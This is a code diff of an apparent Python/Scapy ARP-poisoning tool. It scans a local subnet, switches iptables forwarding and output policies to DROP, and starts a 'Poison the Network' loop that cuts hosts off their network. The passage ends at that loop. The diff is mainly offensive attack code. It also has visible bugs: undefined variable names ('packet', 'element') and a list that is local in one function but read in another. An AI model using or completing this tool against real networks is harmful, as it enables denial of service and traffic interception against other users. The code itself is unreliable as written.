@@ -39,7 +39,7 @@ def get_mac_address(ip, interface):
 
 def ip_parser(ap_ip):
     if ap_ip[1] == "9":
-        cidr = "192.168.1.1"
+        cidr = "192.168.1.1/24"
     elif ap_ip[1] == "0":
         cidr = "10.0.0.0/24"
     else:
@@ -48,7 +48,10 @@ def ip_parser(ap_ip):
     ether = Ether(dst="ff:ff:ff:ff:ff:ff")
     pckt = ether/arp
     result = srp(packet, timeout=3, verbose=False)[0]
-    for element in result:
+    ip_list = []
+    print(result)
+    for sent,received in result:
+        print({'ip': received.psrc, 'mac': received.hwsrc})
         ip_list.append(element.psrc)
     return ip_list
 
@@ -63,35 +66,34 @@ def reARP(target_ip, ap_ip):
         
 
 def exit_handler(interface, ap_ip):
+    print("Disabling IP forwarding...")
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print(GREEN + "Disabled Successfully!" + NONE)
+    print("Unlocking entire outbound traffic...")
+    os.system(f"iptables -P FORWARD ACCEPT")
+    os.system(f"iptables -P OUTPUT ACCEPT")
+    print(GREEN + "Done!" + NONE)
+    print("Restoring targets...")
     try:
-        print("Disabling IP forwarding...")
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print(GREEN + "Disabled Successfully!" + NONE)
-        print("Unlocking entire forwarded traffic...")
-        os.system(f"iptables -A FORWARD -o {interface} -j ACCEPT")
-        print(GREEN + "Done!" + NONE)
-        print("Restoring targets...")
-        try:
-            for target_ip in ip_list:
-                reARP(target_ip, ap_ip)
-                print(GREEN + f"Restored {target_ip}" + NONE)
-        except KeyboardInterrupt:
-            print(ERR + "User Interruption, halting..." + NONE)
-        print(GREEN + "Done!" + NONE)
-        print(ERR + "Exiting..." + NONE)
-        sys.exit(1)
-    except:
-        print(BAD_ERR + "CRITICAL ERROR WHILE SHUTTING DOWN, FORCING SHUTDOWN..." + NONE)
-        sys.exit(1)
+        for target_ip in ip_list:
+            reARP(target_ip, ap_ip)
+            print(GREEN + f"Restored {target_ip}" + NONE)
+    except KeyboardInterrupt:
+        print(ERR + "User Interruption, halting..." + NONE)
+    print(GREEN + "Done!" + NONE)
+    print(ERR + "Exiting..." + NONE)
+    sys.exit(1)
 
 def proxier(ap_ip, interface):
     try:
         ap_mac = get_mac_address(ap_ip, interface)
-        print(NONE + "Parsing available IP adresses...")
+        print(ap_mac)
+        print(NONE + "Parsing available IP addresses...")
         ip_list = ip_parser(ap_ip)
         print(GREEN + "Done!" + NONE)
-        print("Blocking entire forwarded traffic...")
-        os.system(f"iptables -A FORWARD -o {interface} -j DROP")
+        print("Blocking entire outbound traffic...")
+        os.system(f"iptables -P FORWARD DROP")
+        os.system(f"iptables -P OUTPUT DROP")
         print(GREEN + "Done!" + NONE)
         print("Starting to Poison the Network...")
         while 1 < 2:
